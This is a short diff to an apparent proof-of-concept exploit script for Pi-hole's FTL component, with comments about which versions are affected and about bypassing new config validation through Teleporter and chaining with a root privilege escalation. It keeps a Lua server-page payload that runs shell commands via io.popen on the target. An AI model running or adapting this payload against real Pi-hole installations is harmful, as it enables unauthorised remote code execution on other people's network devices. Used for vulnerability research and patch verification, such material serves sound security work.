@@ -15,8 +15,12 @@
 # FTL unpatched as of 6.7.1
 # fix is in HEAD, should be patched in >= 6.7.2
 #
-PIPASS="password"
-PIHOST="http://pi.hole"
+# this poc is for <= 6.7, for 6.7.1 you would want to use Teleporter to bypass the new config validation
+# if i find another root LPE, i'll write a new chain that uses this technique through Teleporter to stage it
+#
+PIHOST="${PIHOST:-http://pi.hole}"
+PIPASS="${PIPASS:-password}"
+
 PAYLOAD='<?lua mg.write(io.popen("hostname;uptime;id;grep ^Cap /proc/self/status;pihole version;"):read("*a")) ?>'
 do_cleanup=false
 
